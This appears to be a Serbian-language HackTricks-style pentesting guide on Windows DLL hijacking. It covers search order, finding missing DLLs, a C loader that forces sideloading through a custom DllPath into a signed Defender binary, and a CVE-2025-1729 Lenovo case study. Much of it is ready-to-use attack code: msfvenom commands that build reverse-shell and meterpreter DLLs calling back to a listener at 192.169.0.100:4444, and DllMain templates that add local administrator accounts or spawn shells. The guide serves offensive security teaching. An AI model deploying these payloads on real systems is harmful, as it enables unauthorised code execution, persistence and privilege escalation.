# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Osnovne informacije

DLL Hijacking podrazumeva manipulaciju pouzdanom aplikacijom da učita zlonamerni DLL. Ovaj termin obuhvata više taktika kao što su **DLL Spoofing, Injection, and Side-Loading**. Koristi se uglavnom za izvršavanje koda, postizanje persistencije i, ređe, za eskalaciju privilegija. Iako je ovde fokus na eskalaciji, metod hijack-ovanja ostaje isti bez obzira na cilj.

### Uobičajene tehnike

Koristi se nekoliko metoda za DLL hijacking, čija je efikasnost zavisna od strategije učitavanja DLL-ova koju aplikacija koristi:

1. **DLL Replacement**: Zamena originalnog DLL-a zlonamernim, opciono uz korišćenje DLL Proxyinga da bi se sačuvala funkcionalnost originalnog DLL-a.
2. **DLL Search Order Hijacking**: Postavljanje zlonamernog DLL-a u putanju pre legitimnog DLL-a, iskorišćavajući obrazac pretrage aplikacije.
3. **Phantom DLL Hijacking**: Kreiranje zlonamernog DLL-a koji aplikacija pokušava da učita misleći da je u pitanju nepostojeći obavezan DLL.
4. **DLL Redirection**: Modifikacija parametara pretrage kao što su %PATH% ili .exe.manifest / .exe.local fajlovi da se aplikacija usmeri na zlonamerni DLL.
5. **WinSxS DLL Replacement**: Zamena legitimnog DLL-a zlonamernim u WinSxS direktorijumu, metoda često povezana sa DLL side-loadingom.
6. **Relative Path DLL Hijacking**: Postavljanje zlonamernog DLL-a u direktorijum pod kontrolom korisnika zajedno sa kopiranom aplikacijom, što podseća na Binary Proxy Execution tehnike.

## Pronalaženje nedostajućih DLL-ova

Najčešći način da se pronađu nedostajući DLL-ovi u sistemu je pokretanje [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) iz sysinternals, **postavljanjem** **sledeća 2 filtera**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

i samo prikažite **File System Activity**:

![](<../../../images/image (153).png>)

Ako tražite **nedostajuće dll-ove u opštem smislu**, pustite ovo da radi nekoliko **sekundi**.\
Ako tražite **nedostajući dll unutar određenog izvršnog fajla**, treba da postavite još jedan filter kao što je "Process Name" "contains" "\<exec name>", izvršite ga i zaustavite hvatanje događaja.

## Eksploatisanje nedostajućih DLL-ova

Da bismo eskalirali privilegije, najbolja šansa je biti u mogućnosti da **zapišemo DLL koji će proces sa višim privilegijama pokušati da učita** u nekom od **mesta gde će se tražiti**. Dakle, moći ćemo da **zapišemo** DLL u **folder** gde se DLL pretražuje pre foldera gde se nalazi **originalni DLL** (čudan slučaj), ili ćemo moći da **zapišemo u neki folder gde će se DLL tražiti**, dok originalni **DLL ne postoji** ni u jednom folderu.

### Dll redosled pretrage

U [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) možete naći tačan način na koji se DLL-ovi učitavaju.

Windows aplikacije traže DLL-ove prateći skup unapred definisanih putanja za pretragu, u određenom redosledu. Problem DLL hijacking-a nastaje kada se zlonamerni DLL strateški postavi u jedan od tih direktorijuma tako da bude učitan pre autentičnog DLL-a. Rešenje da se to izbegne je osigurati da aplikacija koristi apsolutne putanje kada referencira potrebne DLL-ove.

Možete videti **DLL search order on 32-bit** systems ispod:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Ovo je **podrazumevani** redosled pretrage sa omogućenim **SafeDllSearchMode**. Kada je on onemogućen, trenutni direktorijum prelazi na drugo mesto. Da biste onemogućili ovu opciju, kreirajte vrednost registrija **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i postavite je na 0 (podrazumevano je omogućeno).

Ako se funkcija [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) pozove sa **LOAD_WITH_ALTERED_SEARCH_PATH** pretraga počinje u direktorijumu izvršnog modula koji [**LoadLibraryEx**] učitava.

Na kraju, imajte na umu da **dll može biti učitan navođenjem apsolutne putanje umesto samo imena**. U tom slučaju taj dll će **biti tražen samo u toj putanji** (ako taj dll ima neke zavisnosti, one će se tražiti kao da su učitane po imenu).

Postoje i drugi načini da se promeni redosled pretrage, ali ih ovde neću objašnjavati.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Napredan način da se deterministički utiče na putanju pretrage DLL-ova novokreiranog procesa je postavljanje polja DllPath u RTL_USER_PROCESS_PARAMETERS prilikom kreiranja procesa koristeći ntdll-ove native API-je. Davanjem direktorijuma pod kontrolom napadača ovde, ciljani proces koji razrešava importovani DLL po imenu (bez apsolutne putanje i bez korišćenja safe loading flag-ova) može biti primoran da učita zlonamerni DLL iz tog direktorijuma.

Ključna ideja
- Sastavite parametre procesa koristeći RtlCreateProcessParametersEx i navedite prilagođeni DllPath koji ukazuje na vaš kontrolisani folder (npr. direktorijum gde se nalazi vaš dropper/unpacker).
- Kreirajte proces koristeći RtlCreateUserProcess. Kada ciljni binarni fajl razreši DLL po imenu, loader će konsultovati dostavljeni DllPath tokom razrešavanja, omogućavajući pouzdan sideloading čak i kada zlonamerni DLL nije u istom direktorijumu kao ciljni EXE.

Napomene/ograničenja
- Ovo utiče na dete proces koji se kreira; drugačije je od SetDllDirectory, koje utiče samo na trenutni proces.
- Cilj mora importovati ili LoadLibrary DLL po imenu (bez apsolutne putanje i bez korišćenja LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i hardkodirane apsolutne putanje ne mogu biti hijack-ovane. Forwarded exports i SxS mogu promeniti prioritet.

Minimalni C primer (ntdll, wide strings, pojednostavljeno rukovanje greškama):
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
Operativni primer upotrebe
- Postavite zlonamerni xmllite.dll (koji eksportuje potrebne funkcije ili prosleđuje pozive stvarnom DLL-u) u direktorijum DllPath.
- Pokrenite potpisani binarni fajl koji je poznato da traži xmllite.dll po imenu koristeći gore opisanu tehniku. Loader rešava import preko prosleđenog DllPath-a i sideloads vaš DLL.

Ova tehnika je u prirodi (in-the-wild) primećena da pokreće višestepene sideloading lance: inicijalni launcher postavi pomoćni DLL, koji potom spawn-uje Microsoft-signed, hijackable binarni fajl sa prilagođenim DllPath-om kako bi primorao učitavanje napadačevog DLL-a iz staging direktorijuma.


#### Izuzeci u redosledu pretrage DLL-ova iz Windows dokumentacije

U Windows dokumentaciji su zabeleženi određeni izuzeci od standardnog reda pretrage DLL-ova:

- Kada se naiđe na **DLL koji deli ime sa onim koji je već učitan u memoriji**, sistem zaobilazi uobičajenu pretragu. Umesto toga, izvršava proveru za redirekciju i manifest pre nego što podrazumevano koristi DLL koji je već u memoriji. **U ovom scenariju, sistem ne vrši pretragu za DLL-om**.
- U slučajevima kada je DLL prepoznat kao **poznati DLL** za trenutnu verziju Windows-a, sistem će koristiti svoju verziju tog poznatog DLL-a, zajedno sa bilo kojim njegovim zavisnim DLL-ovima, **odustajući od procesa pretrage**. Registarski ključ **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** sadrži listu ovih poznatih DLL-ova.
- Ako **DLL ima zavisnosti**, pretraga za tim zavisnim DLL-ovima vrši se kao da su naznačeni samo njihovim **imenima modula**, bez obzira na to da li je početni DLL identifikovan pomoću pune putanje.

### Eskalacija privilegija

**Zahtevi**:

- Identifikujte proces koji radi ili će raditi pod **različitim privilegijama** (horizontal or lateral movement), a kojem **nedostaje DLL**.
- Obezbedite da su dostupna **prava za pisanje** za bilo koji **direktorijum** u kojem će se tražiti **DLL**. Ovo mesto može biti direktorijum izvršnog fajla ili direktorijum unutar sistemskog PATH-a.

Da, zahtevi su komplikovani za pronalaženje jer je **po defaultu prilično neobično naći privilegovani izvršni fajl kome nedostaje DLL** i još je **čudnije imati prava za pisanje na folderu u sistemskom PATH-u** (po defaultu to nije moguće). Međutim, u pogrešno konfigurisanim okruženjima ovo je moguće.  
Ako imate sreće i ispunjavate zahteve, možete pogledati projekat [UACME](https://github.com/hfiref0x/UACME). Iako je **glavni cilj projekta da zaobiđe UAC**, možda ćete tamo naći **PoC** za Dll hijaking za verziju Windows-a koju možete iskoristiti (verovatno samo menjajući putanju foldera u kojem imate prava za pisanje).

Imajte na umu da možete **proveriti svoja prava u folderu** tako što ćete:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **proverite dozvole svih direktorijuma unutar PATH-a**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Takođe možete proveriti imports izvršne datoteke i exports dll-a pomoću:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Za kompletan vodič kako da **abuse Dll Hijacking to escalate privileges** sa dozvolama za upis u **System Path folder** pogledajte:


{{#ref}}
writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) će proveriti da li imate dozvole za pisanje u bilo koji folder unutar system PATH.\
Drugi interesantni automatizovani alati za otkrivanje ove ranjivosti su **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll._

### Example

Ako nađete iskoristiv scenario, jedna od najvažnijih stvari za uspešan exploit biće da **napravite dll koji eksportuje bar sve funkcije koje će izvršni fajl importovati iz njega**. Imajte na umu da Dll Hijacking može biti koristan za [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ili za [ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Primer **kako kreirati validan dll** možete naći u ovoj studiji o dll hijacking-u fokusiranoj na dll hijacking za izvršenje: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Štaviše, u **sledećem delu** možete naći neke **osnovne dll kodove** koji mogu biti korisni kao **šabloni** ili za kreiranje **dll-a sa eksportovanim funkcijama koje nisu potrebne**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

U suštini, **Dll proxy** je Dll koji može **izvršiti vaš zlonamerni kod kada se učita**, ali i da **izlaže** i **radi** kako se očekuje tako što **prosleđuje sve pozive pravoj biblioteci**.

Pomoću alata [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ili [**Spartacus**](https://github.com/Accenture/Spartacus) možete zapravo **odabrati izvršni fajl i izabrati biblioteku** koju želite proxify-ovati i **generisati proxified dll** ili **odabrati Dll** i **generisati proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Dobijte meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kreiraj korisnika (x86 nisam video x64 verziju):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Vaš sopstveni

Imajte na umu da u nekoliko slučajeva Dll koji kompajlirate mora **export several functions** koje će učitati victim process; ako these functions doesn't exist, **binary won't be able to load** ih i **exploit will fail**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Studija slučaja: CVE-2025-1729 - Privilege Escalation korišćenjem TPQMAssistant.exe

Ovaj slučaj prikazuje **Phantom DLL Hijacking** u Lenovo-ovom TrackPoint Quick Menu (`TPQMAssistant.exe`), praćeno kao **CVE-2025-1729**.

### Detalji ranjivosti

- **Komponenta**: `TPQMAssistant.exe` koji se nalazi na `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Zakazani zadatak**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` se izvršava dnevno u 9:30 AM pod kontekstom prijavljenog korisnika.
- **Dozvole direktorijuma**: Writable by `CREATOR OWNER`, što omogućava lokalnim korisnicima da ubace proizvoljne datoteke.
- **DLL Search Behavior**: Pokušava prvo da učita `hostfxr.dll` iz svog radnog direktorijuma i beleži "NAME NOT FOUND" ako nedostaje, što ukazuje na prioritet pretrage lokalnog direktorijuma.

### Exploit Implementation

Napadač može postaviti zlonamerni `hostfxr.dll` stub u isti direktorijum, iskorišćavajući nedostajući DLL da ostvari code execution u kontekstu prijavljenog korisnika:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Tok napada

1. Kao standardni korisnik, ubaci `hostfxr.dll` u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Sačekaj da se zakazani zadatak pokrene u 9:30 u kontekstu trenutnog korisnika.
3. Ako je administrator prijavljen kada se zadatak izvrši, zlonamerni DLL će se pokrenuti u administratorskoj sesiji sa medium integrity.
4. Lančano primeni standardne UAC bypass techniques da eskaliraš privilegije sa medium integrity na SYSTEM privilegije.

### Mitigacija

Lenovo je objavio UWP verziju **1.12.54.0** via the Microsoft Store, koja instalira TPQMAssistant u `C:\Program Files (x86)\Lenovo\TPQM\TPQMAssistant\`, uklanja ranjivi zakazani zadatak i deinstalira nasleđene Win32 komponente.

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)


- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)


- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)


{{#include ../../../banners/hacktricks-training.md}}
